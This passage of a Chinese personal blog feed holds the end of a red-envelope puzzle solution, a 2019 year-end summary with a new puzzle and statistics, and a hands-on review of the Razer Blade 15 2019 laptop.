size-full wp-image-1538\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1131\" height=\"278\"></a>\n<p>扔到浏览器里会出现奶冰同款找不到 IP，于是可以联想到 TXT 记录。唯一的问题是 🤔 这个 Emoji 需要如何处理。域名使用 Punycode 将 Unicode 字符转换为 ASCII 字符，特点是以 <code>xn--</code> 开头。如果你把上面这个域名扔进浏览器，你会发现它变成了 <code>xn--wp9h.axton.cc</code>。然后查询 TXT 记录，即可得到红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1527\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"804\" height=\"557\"></a>\n","link":"https://flyhigher.top/develop/1519.html"},{"title":"无垠 2019 年度总结","date":"2019-12-29 12:25:52","description":"\n<p>又是时间飞快的一年…写 2018 总结的情景似乎还在眼前，转眼居然已经到 2019 年末了。</p>\n<p>2019 年，发生了太多事情，包括真的转折了人生的高考，这也导致我博客更新的不多（难以置信居然才更了两篇…），不过两篇技术性文章已经在路上了，可以期待一下。</p>\n<p>2019 年我也学了不少东西（单指技术方面），比如终于认真学了 Vue（但是还要练手）。书买了一大堆，看完的倒是没几本orz</p>\n<p>呼，好吧，是时候回顾一下充满坎坷的这一年了。2019 年还剩下最后两天，希望 2020 年，我能做得更好。</p>\n<h1>一些数据</h1>\n<p>照惯例先来看看一些数据吧。今年是统计系统完整统计了的第二年，终于可以和去年的数据比较一下了。以下数据的统计范围是 2019年1月1日0时至 2019年12月29日20时。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 26,901 (<span>+4%</span>)，年 PV 76,583 (<span>+3%</span>)，日均 UV 73.7，平均停留时间 5分13秒 (<span>-13.8%</span>)，平均跳出率 53% (<span>+20.5%</span>)。一年有效文章数 2 (<span>-50%</span>)，新增评论 439 条。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"1143\" class=\"aligncenter size-full wp-image-1511\"></a>\n<p>有趣的是今年文章数腰斩，访问数反而小有提升。<del>如果我哪天不更新了，访问数是不是可以无限大呢？</del></p>\n<p>今年博客最大的改动就是把整体风格切换到了 Material Design 2（当然这是 <a href=\"https://flyhigher.top/develop/788.html\">MDx</a> 中的可选功能，给自己打个广告2333），此外还有比较失败的 WebP 改造计划，因为和缓存冲突已经回滚了。<a href=\"https://flyhigher.top/develop/1245.html\">ABS 系统</a>进展不大，主要是真的没有太多时间，还是要再学习一个。</p>\n<h2>个人主页</h2>\n<p>虽然个人主页的 TODO List 列了老长，但今年完全没有更新，也没有推广，从今年 8 月底开始还莫名被某墙认证了，直到 11 月底才恢复，于是今年总访问量比去年少了很多，</p>\n<p>有多少呢？这么少：总 UV 2,141 (<span>-65.9%</span>)，总 PV 2,744 (<span>-66.6%</span>)，日均 UV 6 (<span>-65.9%</span>)，平均停留时间 62秒 (<span>+19.2%</span>)。主要来源是知乎和 V2EX，还有一些甚至是从微信来的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"1103\" class=\"aligncenter size-full wp-image-1512\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 8 次，新增 171 commits，2 种语言的翻译，Star 数增加了 175，现有 408。感谢所有人的支持，尤其是 <a href=\"https://github.com/Sn0bzy\" rel=\"noopener noreferrer\" target=\"_blank\">Hasan CAN</a>, <a href=\"https://github.com/yechs\" rel=\"noopener noreferrer\" target=\"_blank\">Ye Shu</a>, <a href=\"https://github.com/StarryLeo\" rel=\"noopener noreferrer\" target=\"_blank\">StarryLeo</a>, <a href=\"https://github.com/DCTewi\" rel=\"noopener noreferrer\" target=\"_blank\">冻葱Tewi</a>, <a href=\"https://github.com/syfxlin\" rel=\"noopener noreferrer\" target=\"_blank\">Otstar Lin</a> 等为 MDx 做出了不小贡献的你们。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：<a href=\"https://flyhigher.top/photograph/1309.html\">上手</a> DJI OSMO Pocket</li>\n<li>四月：最后一次参加浙江省普通高中学业水平考试</li>\n<li>五月：MDx 喜提 300 Stars</li>\n<li>六月：高考 <del>炸了，差亿点点上浙大</del>\n</li>\n<li>六月：入手了 Oneplus 7 Pro</li>\n<li>六月：和同学一起去成都重庆旅行</li>\n<li>六月：第一次近距离感受到地震</li>\n<li>六月：<a href=\"https://flyhigher.top/diary/1411.html\">入手</a>了一台雷蛇灵刃 15，目前是主力机</li>\n<li>七月：参与组织 THE Hack 2019 活动</li>\n<li>七月：面基了 <a href=\"https://itroy.cc/\" rel=\"noopener noreferrer\" target=\"_blank\">Tory</a>, Bie Shi 和 <a href=\"https://oxz.me/\" rel=\"noopener noreferrer\" target=\"_blank\">FHYunCai</a>\n</li>\n<li>八月：一个人去厦门武汉转了一圈，拍了自己的第一个 Vlog</li>\n<li>八月：入手了一个 Kindle Paperwhite 4，没有泡面可以压，于是用来看英文小说了</li>\n<li>八月：加入 TEDxNingbo 志愿者团队</li>\n<li>八月：和 Ralph 面基</li>\n<li>八月：入手了一个 Yubikey</li>\n<li>九月：人生第一次参加雅思考试 <del>7分，蛮开心的</del>\n</li>\n<li>十月：入手了一个 Samsung Galaxy Watch Active 2 <del>觉得不值</del>\n</li>\n<li>十一月：MDx 达到 400 Stars</li>\n<li>十一月：为 TEDxNingbo 设计开发的 H5 上线</li>\n<li>十一月：入手了第一台胶片相机，试图入坑胶片摄影</li>\n<li>十一月：参加 TEDxNingbo 2019 大会</li>\n<li>十二月：<del>我 Cytus II 入门了</del>\n</li>\n</ul>\n<h1>跨年红包</h1>\n<p>这算「传统习俗」了。和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2020年1月2日。</p>\n<p>今年的解谜旅程，从下面这个字符串开始。</p>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>由于今年的题目比以前稍微难了一些，所以今年的红包金额还是比较大的，而且不限量，尽你所能试一试吧。</p>\n<p>一点你可能用得上的提示：URL 里全是 ASCII 字符 / 24×3，横向读取。</p>\n<p><a href=\"https://flyhigher.top/develop/1519.html\">答案</a>已公布。</p>\n<h1>跨年海报</h1>\n<p>这算是另一个「传统习俗」（笑）。因为我有做跨年海报的习惯，所以以下就是今年份的海报啦。</p>\n<p>用了 C4D+PS，还有我的一整个下午。</p>\n<p>提前祝各位新年快乐！</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter wp-image-1467 size-large\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90&amp;x-oss-process=image/resize,m_fill,w_1448,h_2048/interlace,1/quality,Q_90#%23\" alt=\"\" width=\"724\" height=\"1024\"></a>\n","link":"https://flyhigher.top/diary/1464.html"},{"title":"Razer Blade 灵刃 15 2019 精英版简评","date":"2019-07-27 19:22:58","description":"\n<blockquote><p>“你这什么电脑啊，也是惠普的么？比我的还重一点欸。”同学拿着暗影精灵说。<br>\n“emmmm….杂牌电脑，买灯送的。”</p></blockquote>\n<h1>故事</h1>\n<p>考完高考，该换台电脑了。我此前在用的是一台 Dell Inspiron 15 7560，一台从商务本的角度来看还算不错的笔记本，平常用来写写代码还不错，但在我剪视频以及折腾 C4D 的时候明显有些力不从心，更别提运行大型游戏了。于是趁着这次换机机会，我打算换一台<strong>性能还算不错，又能带着走</strong>的笔记本。这么想着，我列出了我的需求：</p>\n<ul>\n<li>性能较高</li>\n<li>便携性好（薄、重量轻、电池续航长等）</li>\n<li>外观低调</li>\n<li>预算最高 2.5w</li>\n</ul>\n<p>由于并不喜欢外观太张扬的「游戏本风格」，我希望我选择的笔记本外观干净低调。此外，由于我最近正在折腾学习 ML，我希望显卡可以是 20 系的（虽然 10 系也不是不能用…）。满足以上需求的只有以下几种选择：</p>\n<ul>\n<li>技嘉 Aero 15</li>\n<li>Razer Blade 15 2019 精英版</li>\n<li>msi GS75</li>\n</ul>\n<p>至于败家之眼由于太过张扬，直接被我排除了。在仅剩的三个选择里面，Razer Blade 15 的外观在我看来是最低调简约的，而且屏幕有 1080P+240Hz 和 4K+触摸两种都很不错的规格可选，唯一的问题大概就是在 10 代 U 都快能买到的时候，Razer Blade 15 的 CPU 还是 8 代的。</p>\n<p>（哦…缺点大概还有比较贵吧…）</p>\n<p>在我纠结的时候，我联系的卖家告诉我 Razer Blade 9 代 U 的版本已经到国内总代了，如果顺利的话他可以在 6.16 第一批直接给我发货；另外他也可以为高考生提供优惠。既然都这样了还有什么好纠结的，买了！选了 2070 Max-Q/16GB/256GB/1080P/240Hz 的版本，下单付款，果然在 16 号顺利入手。</p>\n<p>最终确定这个配置是因为 2080 的版本太贵，但是 4K 触摸屏版本只在 2080 版本上有，只好选了 1080P；另外 512 GB 的版本比我买的 256 GB 贵了 2K，于是决定自己买块 1T 的盘换掉。</p>\n<h1>开箱</h1>\n<p>包装箱也很低调，只在侧面露出一抹骚绿。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1398\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>正面和背面。照片是在用了一个多月以后拍的，看起来有点脏。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1349\" class=\"aligncenter size-full wp-image-1394\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-300x202.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-768x518.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-1024x691.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1630\" class=\"aligncenter size-full wp-image-1386\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-300x213.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-768x544.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-1024x726.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>卸下后盖十颗梅花螺丝就能打开后盖。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"2636\" class=\"aligncenter size-full wp-image-1399\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-228x300.jpg 228w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-768x1012.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-777x1024.jpg 777w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>SSD、内存条和无线网卡都在触手可及的地方。这张图里我已经换好了 SSD。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1790\" class=\"aligncenter size-full wp-image-1400\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-300x215.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-768x550.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-1024x733.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>网卡是 AX200NGW，Intel 第一款支持 Wi-Fi 6 的网卡，好评。内存为双通道 DDR4，支持 XMP，不过我懒得折腾了。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1795\" class=\"aligncenter size-full wp-image-1401\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-300x269.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-768x689.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-1024x919.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><strong>后盖只有一处卡扣，在靠近转轴一侧中间的位置，安装后盖的时候需要注意下。此外后盖和机身卡得比较紧，安装的时候需要注意下后盖有没有完全卡入机身。</strong></p>\n<p>然后开机。硬盘复制和升级系统什么的就不再赘述了。自带 Windows 10 家庭版，为了装 Docker 我升级到了专业版。</p>\n<p>从开箱到现在，我已经使用这台电脑一月有余。讲讲使用上的感受吧。</p>\n<h1>机身</h1>\n<p><strong>有人说 Blade 就是 Windows 版的 Macbook，这个说法其实还算贴切。</strong>整个金属材质的 A 面只有一个 Razer 的 Logo，屏幕点亮的时候会一同亮起。B 面是支持 Windows Hello 的摄像头、屏幕和一个比较低调的 Razer Logo。屏幕三面边框比较窄，观感不错。<strong>而一旦打开屏幕，Windows Hello 就会开始识别你的面部，并极快地解锁进入桌面，很舒服。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1500\" class=\"aligncenter size-full wp-image-1396\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-1024x768.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><span>和 Windows Hello 说声 Hello？</span></p>\n<p><strong>B 面边缘有一圈非常细的胶圈，可以在屏幕闭合的时候起密封的作用（不过实测效果不大…）。</strong>C 面是键盘、扬声器、开机键和触控板，这些后面会细说。<strong>D 面是塑料材质，有两条蛮厚的橡胶条把机身垫高</strong>，猜测是为了散热。</p>\n<p>Razer Blade 15 的接口比较丰富。左侧：</p>\n<ul>\n<li>电源接口</li>\n<li>2 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个 3.5 mm 组合音频插孔</li>\n</ul>\n<p>右侧：</p>\n<ul>\n<li>1 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个雷电 3 接口（通过 GPU 输出）</li>\n<li>1 个 HDMI 2.0B 接口</li>\n<li>1 个 MiniDisplayPort 1.4 接口</li>\n<li>安全锁孔</li>\n</ul>\n<p>这些接口日常使用完全够用，通过雷电 3 也能获得不错的拓展性（不过雷电 3 似乎需要跟独显抢带宽…）。</p>\n<p><strong>机身边缘比较锐，不过出乎意料地不是非常割手。</strong>之前在用的 Dell Inspiron 15 7560 边缘极其锋利，非常割手，难受。现在（相对来说）打字舒服很多了，好评。</p>\n<p><strong>机身很薄，薄到有点出乎意料。</strong>官方数据只有 17.8mm，就算加上把机身垫高了的橡胶条也还是比一枚硬币矮。然而毕竟还是塞了这么多硬件进去，看起来轻薄但<strong>实际上一点都不轻</strong>，官方数据 2.07 kg，加上砖头一样的电源适配器，<strong>出趟门其实还是有点累的。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1136\" class=\"aligncenter size-full wp-image-1395\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-300x148.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-768x379.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-1024x506.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>续航</h1>\n<p>出乎意料，<strong>续航还不错</strong>，达到了我的预期。电池达到了 80Wh，我日常一个 VSCode 写代码，一个 Chrome 查资料，<strong>续航可以达到 8 小时出头</strong>，就算是在玩 HITMAN 1 小时后，电量仍能剩余一半左右。也就是说，短时间的移动办公完全不是问题，可以不带上厚重的电源适配器，算是解决了一部分「重」的问题吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1860\" class=\"aligncenter size-full wp-image-1397\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-300x223.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-768x571.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-1024x762.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>电源适配器有点大</span></p>\n<h1>屏幕</h1>\n<p><strong>爽！真的爽！240Hz 刷新率带来的是实打实的流畅感</strong>，和 90Hz 那种需要用一段时间才能感受到的流程感不同， 240Hz 带来的是在桌面上划划鼠标都能感受到的异常流畅的感觉。</p>\n<p>不过受限于这块 2070 Max-Q，很多游戏游戏都没能完全利用这块屏幕的性能，再加上我不玩 FPS 游戏，高刷新率对我来说意义不大，<strong>这块屏幕的 240Hz 对我来说噱头大于实际作用（但是没得选啊…）。</strong>屏幕为 IPS 面板，覆盖 100% sRGB，并有出厂校色。由于我手头没有校色设备，具体参数暂时无法测量，但就官方数据来看，这块屏幕的素质还是不错的。当然 4K 版本由于面向设计师等，屏幕参数会更好，可惜我是体验不到了。</p>\n<h1>键盘、触控板和扬声器</h1>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1619\" class=\"aligncenter size-full wp-image-1391\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-300x211.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-768x541.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-1024x721.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>打开屏幕第一反应：<strong>这触控板有点大啊。</strong>Rzaer Blade 15 配备的触控板比 Dell Inspiron 15 7560 大上一整圈，采用类玻璃材质，手感不错。触控板使用了微软 Precision 驱动，对 Windows 的各类手势支持良好。</p>\n<p><strong>键盘总的来说还行</strong>，键程不短，触感不算太软，为平面键帽；没有小键盘，不过方向键的大小与其他键一致。有一点要吐槽的就是键盘的按键标识是上下颠倒的…也就是需要配合 <kbd>Shift</kbd> 使用的键的标识反而在直接使用的键的标识的下方…虽然影响不大，但打字时看到键盘着实觉得违和。</p>\n<p>没有了小键盘，C 面多出来的空间被留给了扬声器。<strong>而这个声音…比较一般</strong>，整体听感有些薄而含混。不过好歹是 C 面朝上的双扬声器，声音还算清楚，而且立体声的感觉较强。加上自带的 Dolby Atmos 加成，<strong>总体听感还算可以。</strong></p>\n<p>另外，开机键被藏在了右侧扬声器上方，没有灯，有些低调。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"2264\" class=\"aligncenter size-full wp-image-1392\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-300x295.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-768x756.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-1024x1008.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>系统</h1>\n<p>出厂带有 Windows 10 家庭版，预装雷蛇雷云。在雷云内不仅可以调整这台电脑的灯光、性能等设置，还可以一并调整所有连接到这台电脑的雷蛇外设的设置。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1387\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>雷云 3 主界面</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1390\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>灯光拥有丰富的自定义选项（灯厂无疑了）</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"434\" height=\"262\" class=\"aligncenter size-full wp-image-1389\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg 434w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3-300x181.jpg 300w\" sizes=\"(max-width: 434px) 100vw, 434px\"></a>\n<p><span>可以调整屏幕刷新率</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1393\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>通过 Chroma 可以在支持的软件内使键盘背光与软件内容同步</span></p>\n<p><strong>不过由于雷蛇的服务器在大陆一向不稳定，雷云在实际体验上真的是…一言难尽。</strong>有时候会莫名开机不自启、主面板无限加载、灯光配置无法应用…心累。</p>\n<p>此外，显卡驱动似乎也不太稳定（这大概是英伟达的锅？）。偶尔屏幕会突然黑掉，需要合盖再开盖才能再次唤醒屏幕；甚至有一次我遇到了 10 分钟内连续两次蓝屏…至少从错误代码来看问题出在显卡驱动。不过这些问题遇到的几率也不大，一个月内绝大部分时间它还是正常工作的，显卡驱动也没有在我游戏的时候崩掉过。还算能用吧。</p>\n<h1>性能</h1>\n<p>作为妥妥的游戏本，Razer Blade 15 配备了 i7-9750H，RTX2070 Max-Q，16 GB 内存，<strong>性能自然是不差的，基本达到了这一水平笔记本的一般水准。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"702\" height=\"400\" class=\"aligncenter size-full wp-image-1410\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg 702w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19-300x171.jpg 300w\" sizes=\"(max-width: 702px) 100vw, 702px\"></a>\n<p><span>CPU-Z 和 GPU-Z</span></p>\n<p>i7-9750H 默频 2.60GHz，睿频可达 4GHz 左右，<strong>然而只是 30 秒真男人。</strong>25度室温、高性能模式下 30 秒左右的满负载就会让这块 CPU 撞墙，频率会掉到 3GHz 出头并稳定在此，<strong>而平衡模式则更快。</strong></p>\n<p>Razer Blade 15 配备的是一块 Max-Q 版本的 RTX2070，<strong>而且是较低功耗 80W 的版本</strong>，猜测是为了散热考虑（毕竟这么薄了）。风扇全开散热时风扇声音较响，但仍能忍受；而且日常工作使用一般不会使风扇转起来，<strong>因此噪音控制还算不错。</strong></p>\n<p>由于是这篇算是简评，并没有详测游戏，直接上跑分吧。室温 25 度， 平衡模式下 Cinebench R20 分数 1927，有些偏低；而使用高性能模式时分数直接飙到 2424 分，看来平衡模式功耗墙砍得比较狠。（顺便提一句，雷蛇甚至提供了功耗更低的性能方案，没有什么测试的必要就不测了。）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"753\" height=\"637\" class=\"aligncenter size-full wp-image-1405\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg 753w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17-300x254.jpg 300w\" sizes=\"(max-width: 753px) 100vw, 753px\"></a>\n<p>在 3DMark Time Spy 测试下平衡模式 6283 分，高性能模式 6872 分，相比有一点的提升。只能说压得够狠。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"954\" class=\"aligncenter size-full wp-image-1406\" 